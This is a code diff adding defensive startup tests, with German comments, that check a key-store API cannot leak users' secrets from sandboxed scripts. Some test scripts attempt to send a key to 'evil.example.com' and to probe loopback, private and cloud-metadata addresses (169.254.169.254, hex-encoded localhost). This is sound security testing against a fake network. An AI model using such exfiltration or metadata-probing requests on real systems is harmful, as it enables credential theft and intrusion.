@@ -21,6 +21,7 @@ import {
     publicKennelDocsPath,
     publicKennelOpenApiPath,
     classifyDogError,
+    unregisterVmGlobalCapability,
     DOG_OOM_MARKER,
     type DogRunReport,
     type ICacheHandler,
@@ -74,6 +75,48 @@ import { BloodhoundIsochronePact, type BloodhoundIsochroneInput, NearbyLandmarks
 import { randomBytes } from 'crypto';
 import { KeyStoreService, MasterKeyring, type KeyStorePrisma } from './services/KeyStoreService';
 import { KeysRouteHandler } from './api/routes/KeysRouteHandler';
+import {
+    KeyRunState,
+    KeysCapability,
+    REDACTED_KEY,
+    scrubbingConsoleSink,
+    type KeysFetchResult,
+    type KeysNetwork,
+    type KeysOutboundRequest,
+} from './services/keysCapability';
+
+/** Was die Laufzeit-Tests des Key-Stores brauchen (P4c). */
+interface KeysTestDeps {
+    prisma: KeyStorePrisma;
+    appKeyStore?: KeyStoreService;
+    nodesStore: IStore;
+    kennelsController: KennelController;
+    baseDogsMap: Map<string, any>;
+}
+
+/**
+ * Das Fake-Netz fuer keys.fetch (P4c): kein Aufruf verlaesst den Prozess. Es zaehlt, was gesendet
+ * wurde, und echot den Authorization-Header in Body und Header zurueck — der boesartigste Upstream.
+ */
+class FakeKeysNetwork implements KeysNetwork {
+    readonly sent: KeysOutboundRequest[] = [];
+
+    constructor(private readonly hosts: Record<string, string[]> = {}) {}
+
+    async resolve(hostname: string): Promise<string[]> {
+        return this.hosts[hostname] ?? ['93.184.216.34'];
+    }
+
+    async send(request: KeysOutboundRequest): Promise<KeysFetchResult> {
+        this.sent.push(request);
+        const authorization = request.headers.authorization ?? null;
+        return {
+            status: 200,
+            headers: { 'content-type': 'application/json', 'x-echo-authorization': authorization ?? '', 'set-cookie': 'sid=p4c' },
+            body: JSON.stringify({ url: request.url.href, authorization, body: request.body ?? null }),
+        };
+    }
+}
 
 /**
  * Arr, the testament of a single trial endured upon the eldritch seas —
@@ -142,6 +185,8 @@ export class StartupTest {
         app?: any,
         /** Der Auth-Client der App (P4c): die Key-Store-Tests schreiben echte UserKey-Zeilen und raeumen sie ab. */
         authPrisma?: KeyStorePrisma,
+        /** Der Key-Store der App (P4c): nach den Tests mit Fake-Netz wird `keys` wieder auf ihn registriert. */
+        appKeyStore?: KeyStoreService,
     ): Promise<TestResult[]> {
         if (isRuntimeLogVerbose()) {
             console.log('\n🧪 Starte Startup-Tests...\n');
@@ -284,7 +329,14 @@ export class StartupTest {
                 await this.testKeyStoreDbReader(authPrisma);
                 await this.testKeyStoreRotation(authPrisma);
                 await this.testKeysRestIdor(authPrisma);
+                const keysRun = { prisma: authPrisma, appKeyStore, nodesStore, kennelsController: kennelsController as KennelController, baseDogsMap };
+                await this.testKeysEditorTheft(keysRun);
+                await this.testKeysForeignDogExfil(keysRun);
+                await this.testKeysAnonPublicYield(keysRun);
+                await this.testKeysLogScrub(keysRun);
+                await this.testKeysSuperUserTrap(keysRun);
             }
+            await this.testWorkerFetchBlocksPrivateNetworks(nodesStore, kennelsController as KennelController, baseDogsMap);
 
             // Tile-Feature-Cache: atomarer Geo-Store verifizieren
             await this.testTileFeatureCache();
@@ -5192,6 +5244,21 @@ export class StartupTest {
         return MasterKeyring.fromKeys(versions);
     }
 
+    /**
+     * Kein Testwert in keiner gesammelten Ausgabe — roh, URL-kodiert oder JSON-escaped (4c.9).
+     * Die Ausgaben werden als JSON-Text durchsucht, so wie sie eine Antwort traegt.
+     */
+    private static assertNoSecret(label: string, outputs: unknown[], secrets: string[]): void {
+        for (const [i, o] of outputs.entries()) {
+            const text = typeof o === 'string' ? o : JSON.stringify(o) ?? '';
+            for (const s of secrets) {
+                for (const form of [s, encodeURIComponent(s), JSON.stringify(s).slice(1, -1)]) {
+                    if (text.includes(form)) throw new Error(`${label}: Ausgabe ${i} traegt den Testwert`);
+                }
+            }
+        }
+    }
+
     /** Ein Testwert, der nur in diesem Lauf existiert und nach nichts Echtem aussieht. */
     private static keyTestSecret(label: string): string {
         return `p4c-${label}-${randomBytes(12).toString('hex')}`;
@@ -5334,12 +5401,256 @@ export class StartupTest {
 
             const ownDelete = await call('handleDelete', { method: 'DELETE', ctx: as(u1), params: { alias: 'openai' } });
             if (ownDelete.statusCode !== 200 || ownDelete.body?.ok !== true) throw new Error(`DELETE U1: ${ownDelete.statusCode}`);
-            this.assertNoLeak('T8', responses, [secret]);
+            StartupTest.assertNoSecret('T8', responses, [secret]);
             this.addResult(testName, true);
         } catch (error) {
             this.addResult(testName, false, String(error));
         } finally {
             try { await prisma.userKey.deleteMany({ where: { ownerId: { in: [u1, u2] } } }); } catch { /* ignore */ }
+        }
+    }
+
+    /**
+     * Der Rahmen der Laufzeit-Tests (P4c): ein Key-Store mit frischem Test-Master-Key und ein Fake-Netz,
+     * als `keys` registriert; danach wieder die Capability der App. Alle Zeilen der Test-Owner fallen.
+     */
+    private async withKeysHarness(
+        deps: KeysTestDeps,
+        owners: string[],
+        body: (h: { store: KeyStoreService; net: FakeKeysNetwork }) => Promise<void>,
+        options: { superuserOwner?: string; hosts?: Record<string, string[]> } = {},
+    ): Promise<void> {
+        const store = new KeyStoreService(deps.prisma, StartupTest.keyTestRing(), { superuserOwner: options.superuserOwner ?? null });
+        const net = new FakeKeysNetwork(options.hosts);
+        new KeysCapability(store, net).register();
+        try {
+            await body({ store, net });
+        } finally {
+            if (deps.appKeyStore) new KeysCapability(deps.appKeyStore).register();
+            else unregisterVmGlobalCapability('keys');
+            try { await deps.prisma.userKey.deleteMany({ where: { ownerId: { in: owners } } }); } catch { /* ignore */ }
+        }
+    }
+
+    /** Ein Kennel-Lauf ohne gespeicherten Kennel: die Config lebt nur im Speicher, die Dogs im Store. */
+    private async runKeysKennel(
+        deps: KeysTestDeps,
+        kennel: { ownerId: string | null; visibility: Visibility; editors?: string },
+        dogIds: string[],
+        ctx: AuthCtx | undefined,
+    ): Promise<any[]> {
+        const runHandler = new KennelRunHandler({ kennelsController: deps.kennelsController, nodesStore: deps.nodesStore, baseDogsMap: deps.baseDogsMap, callCounter: this.testCallCounter });
+        const id = `test-p4c-kennel-${randomBytes(4).toString('hex')}`;
+        const config: any = { id, lineageId: id, name: 'P4c', dogIds, ...kennel };
+        const waves = await runHandler.runKennel(config, {}, undefined, runHandler.toCapabilityCtx(ctx), undefined, { source: 'unknown' });
+        return waves.flat();
+    }
+
+    /** Der Dog-Code, der einen Schluessel benutzt: der Wert in URL, Header und Body. */
+    private static keyFetchDog(alias: string, host = 'api.example.com'): string {
+        return `const r = await keys.fetch('https://${host}/v1/echo?k={{key:${alias}}}', { method: 'POST', headers: { Authorization: 'Bearer {{key:${alias}}}' }, body: JSON.stringify({ token: '{{key:${alias}}}' }) });\nreturn r;`;
+    }
+
+    /**
+     * Test T1 (Editor-Diebstahl): der Editor U2 legt in U1s Kennel einen Dog, der `{{key:openai}}`
+     * nutzt — sein Lauf findet keinen Alias `openai` (key_not_found), kein Wert im Result oder Fehler.
+     * Gegenprobe: U1s eigener Dog nutzt U1s Key; der Upstream bekommt ihn, der Dog sieht ihn nie.
+     */
+    private async testKeysEditorTheft(deps: KeysTestDeps): Promise<void> {
+        const testName = 'P4c T1: Editor-Diebstahl scheitert (key_not_found), Owner-Lauf ohne Wert im Yield';
+        const stamp = Date.now();
+        const u1 = `test-p4c-t1a-${stamp}`;
+        const u2 = `test-p4c-t1b-${stamp}`;
+        await this.withKeysHarness(deps, [u1, u2], async ({ store, net }) => {
+            try {
+                const secret = StartupTest.keyTestSecret('t1');
+                await store.set(u1, { alias: 'openai', secret, allowedDomains: ['api.example.com'] });
+                const thief = await this.saveAclTestDog(deps.nodesStore, 'P4cThiefDog', StartupTest.keyFetchDog('openai'), { visibility: 'private', ownerId: u2 });
+                const own = await this.saveAclTestDog(deps.nodesStore, 'P4cOwnerDog', StartupTest.keyFetchDog('openai'), { visibility: 'private', ownerId: u1 });
+                const kennel = { ownerId: u1, visibility: 'private' as Visibility, editors: u2 };
+
+                const byEditor = await this.runKeysKennel(deps, kennel, [thief], this.fakeUser(u2));
+                const stolen = byEditor.find((n: any) => n.lineageId === thief);
+                if (!stolen || !String(stolen.error ?? '').includes('key_not_found:openai')) throw new Error(`Editor-Lauf: ${JSON.stringify(stolen?.error ?? stolen?.result)}`);
+                const sentByEditor = net.sent.length;
+                if (sentByEditor !== 0) throw new Error('Editor-Lauf hat gesendet');
+
+                const byOwner = await this.runKeysKennel(deps, kennel, [own], this.fakeUser(u1));
+                const node = byOwner.find((n: any) => n.lineageId === own);
+                if (node?.error || node?.result?.status !== 200) throw new Error(`Owner-Lauf: ${JSON.stringify(node?.error ?? node?.result)}`);
+                if (net.sent.length !== 1 || net.sent[0].headers.authorization !== `Bearer ${secret}` || !net.sent[0].url.href.includes(encodeURIComponent(secret))) {
+                    throw new Error('Upstream bekam den Wert nicht (Ersetzung auf dem Host)');
+                }
+                if (!String(node.result.body).includes(`Bearer ${REDACTED_KEY}`) || node.result.headers['set-cookie'] !== undefined) throw new Error(`Antwort nicht bereinigt: ${JSON.stringify(node.result).slice(0, 200)}`);
+                StartupTest.assertNoSecret('T1', [byEditor, byOwner], [secret]);
+                this.addResult(testName, true);
+            } catch (error) {
+                this.addResult(testName, false, String(error));
+            }
+        });
+    }
+
+    /**
+     * Test T2 (Fremder-Dog-Exfil): im VM-Kontext gibt es keinen Wert und kein keys.get; keys.fetch an
+     * eine nicht erlaubte Domain, eine private Adresse oder mit dem Platzhalter im Host sendet nichts
+     * (Fake-Zaehler 0). P3.5: ein fremder run-only-Dog bekommt die Keys seines Runners nicht.
+     */
+    private async testKeysForeignDogExfil(deps: KeysTestDeps): Promise<void> {
+        const testName = 'P4c T2: Exfil scheitert (kein keys.get, domain_not_allowed, private Netze, Fremd-Dog)';
+        const stamp = Date.now();
+        const u1 = `test-p4c-t2a-${stamp}`;
+        const ux = `test-p4c-t2x-${stamp}`;
+        await this.withKeysHarness(deps, [u1, ux], async ({ store, net }) => {
+            try {
+                const secret = StartupTest.keyTestSecret('t2');
+                await store.set(u1, { alias: 'openai', secret, allowedDomains: ['api.example.com'] });
+                await store.set(u1, { alias: 'internal', secret: StartupTest.keyTestSecret('t2i'), allowedDomains: ['internal.example.com'] });
+                const probe = await this.saveAclTestDog(deps.nodesStore, 'P4cProbeDog',
+                    'return { hasGet: typeof keys.get, view: JSON.stringify(keys), list: await keys.list() };', { visibility: 'private', ownerId: u1 });
+                const attempt = (url: string, header: string) =>
+                    `try { await keys.fetch('${url}', { headers: { X: '${header}' } }); return 'sent'; } catch (e) { return e.message; }`;
+                const evil = await this.saveAclTestDog(deps.nodesStore, 'P4cEvilDog', attempt('https://evil.example.com/', '{{key:openai}}'), { visibility: 'private', ownerId: u1 });
+                const privateNet = await this.saveAclTestDog(deps.nodesStore, 'P4cPrivateDog', attempt('https://internal.example.com/', '{{key:internal}}'), { visibility: 'private', ownerId: u1 });
+                const hostPart = await this.saveAclTestDog(deps.nodesStore, 'P4cHostDog', attempt('https://{{key:openai}}.api.example.com/', 'x'), { visibility: 'private', ownerId: u1 });
+                const plainHttp = await this.saveAclTestDog(deps.nodesStore, 'P4cHttpDog', attempt('http://api.example.com/', '{{key:openai}}'), { visibility: 'private', ownerId: u1 });
+                const foreign = await this.saveAclTestDog(deps.nodesStore, 'P4cForeignDog', attempt('https://api.example.com/', '{{key:openai}}'), { visibility: 'run-only', ownerId: ux });
+
+                const nodes = await this.runKeysKennel(deps, { ownerId: u1, visibility: 'private' }, [probe, evil, privateNet, hostPart, plainHttp, foreign], this.fakeUser(u1));
+                const resultOf = (id: string) => nodes.find((n: any) => n.lineageId === id)?.result;
+                const seen = resultOf(probe);
+                if (seen?.hasGet !== 'undefined' || seen.view !== '{}' || seen.list?.[0]?.alias !== 'internal' || JSON.stringify(seen).includes(secret)) throw new Error(`VM-Kontext: ${JSON.stringify(seen)}`);
+                const expect = (label: string, id: string, pattern: RegExp) => {
+                    const got = String(resultOf(id));
+                    if (!pattern.test(got)) throw new Error(`${label}: ${got}`);
+                };
+                expect('evil.example.com', evil, /^domain_not_allowed$/);
+                expect('privates Netz', privateNet, /^domain_not_allowed$/);
+                expect('Platzhalter im Host', hostPart, /host part/);
+                expect('http', plainHttp, /https only/);
+                expect('fremder run-only-Dog', foreign, /^keys_unavailable$/);
+                if (net.sent.length !== 0) throw new Error(`Fake-fetch gerufen: ${net.sent.length}`);
+                StartupTest.assertNoSecret('T2', [nodes], [secret]);
+                this.addResult(testName, true);
+            } catch (error) {
+                this.addResult(testName, false, String(error));
+            }
+        }, { hosts: { 'internal.example.com': ['10.0.0.5'] } });
+    }
+
+    /** Test T3 (Anon Public-Yield): oeffentlicher Kennel mit Key-Dog, ohne Grant, anonym -> keys_unavailable, kein Wert. */
+    private async testKeysAnonPublicYield(deps: KeysTestDeps): Promise<void> {
+        const testName = 'P4c T3: anonymer Lauf eines oeffentlichen Key-Kennels -> keys_unavailable';
+        const u1 = `test-p4c-t3-${Date.now()}`;
+        await this.withKeysHarness(deps, [u1], async ({ store, net }) => {
+            try {
+                const secret = StartupTest.keyTestSecret('t3');
+                await store.set(u1, { alias: 'openai', secret, allowedDomains: ['api.example.com'] });
+                const dog = await this.saveAclTestDog(deps.nodesStore, 'P4cPublicKeyDog', StartupTest.keyFetchDog('openai'), { visibility: 'public', ownerId: u1 });
+                const nodes = await this.runKeysKennel(deps, { ownerId: u1, visibility: 'public' }, [dog], { user: null, isSuperUser: false });
+                const lead = nodes.find((n: any) => n.lineageId === dog);
+                if (!String(lead?.error ?? '').includes('keys_unavailable') || lead?.result !== undefined) throw new Error(`Lead: ${JSON.stringify(lead?.error ?? lead?.result)}`);
+                if (net.sent.length !== 0) throw new Error('anonymer Lauf hat gesendet');
+                StartupTest.assertNoSecret('T3', [nodes], [secret]);
+                this.addResult(testName, true);
+            } catch (error) {
+                this.addResult(testName, false, String(error));
+            }
+        });
+    }
+
+    /**
+     * Test T6 (Log): ein Dog loggt die Antwort eines Upstreams, der den Auth-Header echot. Die Zeilen
+     * tragen [redacted:key], nie den Wert. Dazu die Senke selbst: eine Zeile mit dem rohen Wert wird
+     * mit dem Laufzustand bereinigt (L7, Host-Scrub).
+     */
+    private async testKeysLogScrub(deps: KeysTestDeps): Promise<void> {
+        const testName = 'P4c T6: console ueber die Bridge, Log-Zeilen bereinigt';
+        const u1 = `test-p4c-t6-${Date.now()}`;
+        await this.withKeysHarness(deps, [u1], async ({ store }) => {
+            const lines: string[] = [];
+            const original = { log: console.log, info: console.info, warn: console.warn, error: console.error };
+            const capture = (...args: unknown[]) => { lines.push(args.map(String).join(' ')); };
+            try {
+                const secret = StartupTest.keyTestSecret('t6');
+                await store.set(u1, { alias: 'openai', secret, allowedDomains: ['api.example.com'] });
+                const dog = await this.saveAclTestDog(deps.nodesStore, 'P4cLogDog',
+                    `${StartupTest.keyFetchDog('openai').replace(/\nreturn r;$/, '')}\nconsole.log(r);\nconsole.warn('p4c-log', r.body);\nreturn r.status;`,
+                    { visibility: 'private', ownerId: u1 });
+                console.log = console.info = console.warn = console.error = capture;
+                const nodes = await this.runKeysKennel(deps, { ownerId: u1, visibility: 'private' }, [dog], this.fakeUser(u1));
+                const run = new KeyRunState();
+                run.remember(secret);
+                scrubbingConsoleSink('log', `p4c-sink ${secret}`, { runState: run });
+                Object.assign(console, original);
+
+                if (nodes.find((n: any) => n.lineageId === dog)?.result !== 200) throw new Error('Log-Dog lief nicht');
+                const dogLines = lines.filter((l) => l.includes('p4c-log') || l.includes('status'));
+                if (dogLines.length < 2 || !dogLines.some((l) => l.includes(REDACTED_KEY))) throw new Error(`Log-Zeilen des Dogs fehlen/unbereinigt: ${dogLines.length}`);
+                if (!lines.includes(`p4c-sink ${REDACTED_KEY}`)) throw new Error('Senke scrubbt nicht');
+                if (lines.some((l) => l.includes(secret))) throw new Error('Log traegt den Wert');
+                this.addResult(testName, true);
+            } catch (error) {
+                Object.assign(console, original);
+                this.addResult(testName, false, String(error));
+            }
+        });
+    }
+
+    /**
+     * Test T7 (Super-User-Falle): {user:null, isSuperUser:true} -> keys_unavailable (fail-closed);
+     * mit KEYSTORE_SUPERUSER_OWNER=U1 (nur lokal) nutzt derselbe Lauf U1s Keys. REST 403 steht in T8.
+     */
+    private async testKeysSuperUserTrap(deps: KeysTestDeps): Promise<void> {
+        const testName = 'P4c T7: Super-User ohne user -> keys_unavailable; KEYSTORE_SUPERUSER_OWNER -> Keys von U1';
+        const u1 = `test-p4c-t7-${Date.now()}`;
+        const superUser: AuthCtx = { user: null, isSuperUser: true };
+        try {
+            let dog = '';
+            let secret = '';
+            await this.withKeysHarness(deps, [u1], async ({ store, net }) => {
+                secret = StartupTest.keyTestSecret('t7');
+                await store.set(u1, { alias: 'openai', secret, allowedDomains: ['api.example.com'] });
+                dog = await this.saveAclTestDog(deps.nodesStore, 'P4cSuperDog', StartupTest.keyFetchDog('openai'), { visibility: 'private', ownerId: u1 });
+                const nodes = await this.runKeysKennel(deps, { ownerId: u1, visibility: 'private' }, [dog], superUser);
+                const lead = nodes.find((n: any) => n.lineageId === dog);
+                if (!String(lead?.error ?? '').includes('keys_unavailable') || net.sent.length !== 0) throw new Error(`ohne Owner: ${JSON.stringify(lead?.error ?? lead?.result)}`);
+            });
+            await this.withKeysHarness(deps, [u1], async ({ store, net }) => {
+                await store.set(u1, { alias: 'openai', secret, allowedDomains: ['api.example.com'] });
+                const nodes = await this.runKeysKennel(deps, { ownerId: u1, visibility: 'private' }, [dog], superUser);
+                const lead = nodes.find((n: any) => n.lineageId === dog);
+                if (lead?.result?.status !== 200 || net.sent.length !== 1) throw new Error(`mit KEYSTORE_SUPERUSER_OWNER: ${JSON.stringify(lead?.error ?? lead?.result)}`);
+                StartupTest.assertNoSecret('T7', [nodes], [secret]);
+            }, { superuserOwner: u1 });
+            this.addResult(testName, true);
+        } catch (error) {
+            this.addResult(testName, false, String(error));
+        }
+    }
+
+    /**
+     * Test 8.9: der native fetch im Dog erreicht keine privaten oder lokalen Netze — Loopback,
+     * Metadaten-Dienst, IPv6-Loopback, `localhost`, Hex-Schreibweise; `data:` bleibt erlaubt.
+     * (Oeffentliche Ziele prueft die Abnahme gegen den laufenden Server.)
+     */
+    private async testWorkerFetchBlocksPrivateNetworks(nodesStore: IStore, kennelsController: KennelController, baseDogsMap: Map<string, any>): Promise<void> {
+        const testName = '8.9: Worker-fetch blockt private Netze (Blocklist), data: bleibt';
+        try {
+            const targets = ['http://127.0.0.1:9/', 'http://169.254.169.254/latest/meta-data/', 'http://[::1]:9/', 'http://localhost:9/', 'http://0x7f.1:9/', 'http://10.0.0.1:9/', 'http://192.168.0.1:9/'];
+            const dog = await this.saveAclTestDog(nodesStore, 'P4cEgressDog',
+                `const out = {};\nfor (const u of ${JSON.stringify(targets)}) { try { await fetch(u); out[u] = 'reached'; } catch (e) { out[u] = String(e.message); } }\n`
+                + `out.data = await (await fetch('data:text/plain,p4c-ok')).text();\nreturn out;`,
+                { visibility: 'private', ownerId: 'UEGRESS' });
+            const deps: KeysTestDeps = { prisma: null as any, nodesStore, kennelsController, baseDogsMap };
+            const nodes = await this.runKeysKennel(deps, { ownerId: 'UEGRESS', visibility: 'private' }, [dog], { user: null, isSuperUser: true });
+            const out = nodes.find((n: any) => n.lineageId === dog)?.result;
+            if (!out) throw new Error(`Dog lief nicht: ${JSON.stringify(nodes.find((n: any) => n.lineageId === dog)?.error)}`);
+            const open = targets.filter((t) => !String(out[t]).startsWith('egress_blocked'));
+            if (open.length) throw new Error(`nicht geblockt: ${open.map((t) => `${t} -> ${out[t]}`).join(' | ')}`);
+            if (out.data !== 'p4c-ok') throw new Error(`data: ${out.data}`);
+            this.addResult(testName, true);
+        } catch (error) {
+            this.addResult(testName, false, String(error));
         }
     }
 
